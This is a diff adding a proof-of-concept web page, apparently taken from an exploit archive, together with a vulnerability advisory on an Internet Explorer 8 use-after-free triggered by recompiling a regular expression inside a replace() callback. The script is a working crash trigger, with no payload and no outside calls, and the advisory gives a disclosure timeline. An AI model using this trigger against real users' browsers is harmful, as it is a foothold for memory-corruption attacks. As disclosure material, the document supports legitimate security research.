@@ -1,0 +1,49 @@
+<!--
+Source: http://blog.skylined.nl/20161116001.html
+
+Synopsis
+
+A specially crafted web-page can cause the Javascript engine of Microsoft Internet Explorer 8 to free memory used for a string. The code will keep a reference to the string and can be forced to reuse it when compiling a regular expression.
+
+Known affected software, attack vectors and mitigations
+
+Microsoft Internet Explorer 8
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Javascript should prevent an attacker from triggering the vulnerable code path.
+-->
+
+<!DOCTYPE html>
+<html>
+  <script>
+    // This Po­C attempts to exploit a use-after-free bug in Microsoft Internet
+    // Explorer 8.
+    // See http://blog.skylined.nl/20161116001.html for details.
+    var r=new Reg­Exp("A|x|x|xx|xxxxxxxxxxxxxxxxxxxx+", "g");
+    "A".replace(r, function (){
+      // Force OLEAUT32 to free the string
+      for (var j = 0; j < 16; j++) new Array(0x1000).join("B");
+      // Reuse the freed memory
+      r.compile();
+    });
+    // This work by Sky­Lined is licensed under a Creative Commons
+    // Attribution-Non-Commercial 4.0 International License. 
+  </script>
+</html>
+
+<!--
+Description
+
+Recompiling the regular expression pattern during a replace can cause the code to reuse a freed string, but only if the string is freed from the cache by allocating and freeing a number of strings of certain size, as explained by Alexander Sotirov in his Heap Feng-Shui presentation.
+
+Exploit
+
+Exploitation was not investigated.
+
+Time-line
+
+March 2015: This vulnerability was found through fuzzing.
+March 2015: This vulnerability was submitted to ZDI.
+April 2015: This vulnerability was acquired by ZDI.
+October 2015: Microsoft addressed this issue in MS15-018.
+November 2016: Details of this issue are released.
+-->
